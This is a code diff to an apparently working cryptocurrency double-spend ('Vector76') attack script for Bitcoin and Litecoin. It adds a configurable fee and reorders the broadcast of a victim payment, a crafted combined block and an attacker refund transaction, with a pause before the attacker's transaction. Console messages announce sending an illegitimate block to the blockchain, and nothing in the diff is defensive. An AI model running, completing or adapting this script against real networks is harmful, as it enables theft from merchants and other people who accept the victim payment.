@@ -24,7 +24,10 @@ parser.add_argument("attacker_address",
                     help="Address held by attacker to receive refund (Please prepare an address that is different from the address fthat can be generated",
                     type=str)
 parser.add_argument("amount_of_coins",
-                    help="Amount of coins sent. (Enter in LTC units) The maximum amount delayed will vary depending on send_from.",
+                    help="Amount of coins sent. (Enter in BTC units) The maximum amount delayed will vary depending on send_from.",
+                    type=float)
+parser.add_argument("fee",
+                    help=". (Enter in BTC units) The maximum amount delayed will vary depending on send_from.",
                     type=float)
 parser.add_argument("symbol",
                     help="coin symbol btc or ltc",
@@ -81,6 +84,7 @@ attacker_address = args.attacker_address
 amount_btc = args.amount_of_coins
 testnet    = args.is_testnet
 coin_symbol = args.symbol
+fee = to_satoshi(args.fee)
 
 if testnet:
     print("testnet mode")
@@ -120,7 +124,6 @@ send_amount = to_satoshi(amount_btc)
 #    print(f"[!] insufficient funds. ")
 #    exit()
 #
-fee = 5000
 
 tx_victim   = [{"address": victim_address, "value": send_amount}]
 tx_attacker = [{"address": attacker_address, "value": send_amount}]
@@ -135,6 +138,8 @@ tx_victim   = cryptos.serialize(tx_victim)
 tx_attacker = cryptos.serialize(tx_attacker)
 
 block = f"{tx_victim}{tx_attacker}"
+vector76 = transaction_util.signall(block, fake_send_from)
+vector76 = cryptos.serialize(vector76)
 #vector76_block = cryptos.serialize(transaction_util.signall(vector76, fake_send_from))
 #vector76_block = cryptos.serialize(transaction_util.signall(vector76, fake_send_from))
 
@@ -143,11 +148,12 @@ print("[+] READY...")
 print()
 print()
 print("--------------------")
-print(f"Send to                       : {victim_address}")
-print(f"Send Amount   (Satoshi unit)  : {send_amount} Satoshi")
-print(f"Victim transaction            : {tx_victim}")
-print(f"Vector76 transaction          : {tx_attacker}")
-print(f"Testnet Mode                  : {testnet}")
+print(f"Send to                           : {victim_address}")
+print(f"Send Coin Amount  (Satoshi unit)  : {send_amount} Satoshi")
+print(f"Send Fee Amount   (Satoshi unit)  : {fee} Satoshi")
+print(f"Victim transaction                : {tx_victim}")
+print(f"Vector76 transaction              : {tx_attacker}")
+print(f"Testnet Mode                      : {testnet}")
 print("--------------------")
 print()
 print()
@@ -162,12 +168,12 @@ print("Index > 強固なブロックチェーン技術に対して強制干渉�
 print()
 time.sleep(2)
 print("SND IBLK TOBC  (不正なブロックを、ブロックチェーンに送信!)")
-time.sleep(2.5)
-txid = transaction_util.pushtx(tx_victim)#transaction_util.send(fake_send_from, transaction_util.wiftoaddr(fake_send_from), victim_address, send_amount, fee=fee)
+txid = transaction_util.send(fake_send_from, transaction_util.wiftoaddr(fake_send_from), victim_address, send_amount, fee=fee)
 print(txid)
-broadcast_transaction(tx_attacker)
-broadcast_transaction(block)
-#input("--- Send the vector76 lock after pressing the enter key. --- ")
+time.sleep(1)
+broadcast_transaction(block, testnet)
+input("--- Send the vector76 lock after pressing the enter key. --- ")
+broadcast_transaction(tx_attacker, testnet)
 print()
 print()
 #print()
